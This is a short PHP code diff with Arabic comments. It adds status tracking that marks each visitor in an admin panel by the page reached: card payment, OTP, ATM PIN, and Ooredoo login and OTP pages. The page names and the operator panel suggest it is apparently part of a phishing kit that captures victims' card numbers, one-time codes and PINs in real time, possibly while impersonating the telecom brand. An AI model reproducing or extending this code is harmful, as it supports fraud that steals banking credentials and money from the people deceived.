@@ -19,6 +19,24 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         
         // إجبار الحالة على 'waiting' لضمان الظهور في لوحة الأدمن كطلب جديد أو محدث
         updateVisitorStep($visitor_id, $step);
+        
+        // تعيين الحالة بناءً على الصفحة والبيانات المدخلة
+        $status = 'waiting'; // الحالة الافتراضية
+        if ($current_page === 'payment.php') {
+            $status = 'بطاقة';
+        } elseif ($current_page === 'otp.php') {
+            $status = 'OTP';
+        } elseif ($current_page === 'pin.php') {
+            $status = 'ATM';
+        } elseif ($current_page === 'ooredoo.php') {
+            $status = 'Ooredoo';
+        } elseif ($current_page === 'otp_ooredoo.php') {
+            $status = 'OTP Ooredoo';
+        }
+        
+        if ($status !== 'waiting') {
+            setVisitorStatus($visitor_id, $status);
+        }
     } catch (Exception $e) {
         error_log("Error updating visitor step: " . $e->getMessage());
     }
